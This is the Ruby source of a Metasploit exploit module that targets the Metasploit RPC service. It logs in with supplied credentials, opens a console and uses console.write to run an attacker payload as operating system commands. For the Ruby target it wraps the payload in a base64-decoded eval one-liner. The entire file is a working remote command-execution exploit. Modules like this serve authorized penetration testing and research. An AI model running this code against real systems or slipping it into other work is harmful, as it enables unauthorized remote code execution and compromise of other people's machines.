# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core/rpc/v10/client&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;Metasploit RPC Console Command Execution&#039;,
      &#039;Description&#039;     => %q{
        This module connects to a specified Metasploit RPC server and
        uses the &#039;console.write&#039; procedure to execute operating
        system commands. Valid credentials are required to access the
        RPC interface.

        This module has been tested successfully on Metasploit 4.15
        on Kali 1.0.6; Metasploit 4.14 on Kali 2017.1; and Metasploit
        4.14 on Windows 7 SP1.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         => &#039;Brendan Coles <bcoles[at]gmail.com>&#039;,
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;https://help.rapid7.com/metasploit/Content/api/rpc/overview.html&#039; ],
          [ &#039;URL&#039;, &#039;https://community.rapid7.com/docs/DOC-1516&#039; ]
        ],
      &#039;Platform&#039;       => %w{ ruby unix win },
      &#039;Targets&#039;        => [
          [ &#039;Ruby&#039;,        { &#039;Arch&#039;     => ARCH_RUBY,
                             &#039;Platform&#039; => &#039;ruby&#039;,
                             &#039;Payload&#039;  => { &#039;BadChars&#039; => "\x00" } } ],
          [ &#039;Windows CMD&#039;, { &#039;Arch&#039;     => ARCH_CMD,
                             &#039;Platform&#039; => &#039;win&#039;,
                             &#039;Payload&#039;  => { &#039;BadChars&#039; => "\x00\x0A\x0D" } } ],
          [ &#039;Unix CMD&#039;,    { &#039;Arch&#039;     => ARCH_CMD,
                             &#039;Platform&#039; => &#039;unix&#039;,
                             &#039;Payload&#039;  => { &#039;BadChars&#039; => "\x00\x0A\x0D" } } ]
        ],
      &#039;DefaultOptions&#039; => { &#039;PrependFork&#039; => true, &#039;WfsDelay&#039; => 15 },
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;May 22 2011&#039;,
      &#039;DefaultTarget&#039;  => 0))
    register_options [ Opt::RPORT(55552),
                       OptString.new(&#039;USERNAME&#039;, [true, &#039;Username for Metasploit RPC&#039;, &#039;msf&#039;]),
                       OptString.new(&#039;PASSWORD&#039;, [true, &#039;Password for the specified username&#039;, &#039;&#039;]),
                       OptBool.new(&#039;SSL&#039;, [ true, &#039;Use SSL&#039;, true]) ]
  end

  def execute_command(cmd, opts = {})
    res = @rpc.call &#039;console.write&#039;, @console_id, "\r\n#{cmd}\r\n"

    if res.nil?
      fail_with Failure::Unknown, &#039;Connection failed&#039;
    end

    unless res[&#039;wrote&#039;].to_s =~ /\A\d+\z/
      print_error "Could not write to console #{@console_id}:"
      print_line res.to_s
      return
    end

    vprint_good "Wrote #{res[&#039;wrote&#039;]} bytes to console"
  end

  def exploit
    begin
      @rpc = Msf::RPC::Client.new :host => rhost, :port => rport, :ssl => ssl
    rescue Rex::ConnectionRefused => e
      fail_with Failure::Unreachable, &#039;Connection refused&#039;
    rescue => e
      fail_with Failure::Unknown, "Connection failed: #{e}"
    end

    res = @rpc.login datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;]

    if @rpc.token.nil?
      fail_with Failure::NoAccess, &#039;Authentication failed&#039;
    end

    print_good &#039;Authenticated successfully&#039;
    vprint_status "Received temporary token: #{@rpc.token}"

    version = @rpc.call &#039;core.version&#039;

    if res.nil?
      fail_with Failure::Unknown, &#039;Connection failed&#039;
    end

    print_status "Metasploit #{version[&#039;version&#039;]}"
    print_status "Ruby #{version[&#039;ruby&#039;]}"
    print_status "API version #{version[&#039;api&#039;]}"

    vprint_status &#039;Creating new console...&#039;
    res = @rpc.call &#039;console.create&#039;

    if res.nil?
      fail_with Failure::Unknown, &#039;Connection failed&#039;
    end

    unless res[&#039;id&#039;].to_s =~ /\A\d+\z/
      print_error &#039;Could not create console:&#039;
      print_line res.to_s
      return
    end

    @console_id = res[&#039;id&#039;]
    print_good "Created console ##{@console_id}"

    print_status &#039;Sending payload...&#039;

    case target[&#039;Platform&#039;]
    when &#039;ruby&#039;
      cmd = "ruby -e &#039;eval(%[#{Rex::Text.encode_base64(payload.encoded)}].unpack(%[m0]).first)&#039;"
    when &#039;win&#039;
      cmd = payload.encoded
    when &#039;unix&#039;
      cmd = payload.encoded
    else
      fail_with Failure::NoTarget, &#039;Invalid target&#039;
    end

    execute_command cmd
  end

  def cleanup
    return if @console_id.nil?

    vprint_status &#039;Removing console...&#039;
    res = @rpc.call &#039;console.destroy&#039;, @console_id

    if res.nil?
      print_error &#039;Connection failed&#039;
      return
    end

    unless res[&#039;result&#039;].eql? &#039;success&#039;
      print_warning "Could not destroy console ##{@console_id}:"
      print_line res.to_s
      return
    end

    vprint_good "Destroyed console ##{@console_id}"
  ensure
    @rpc.close
  end
end

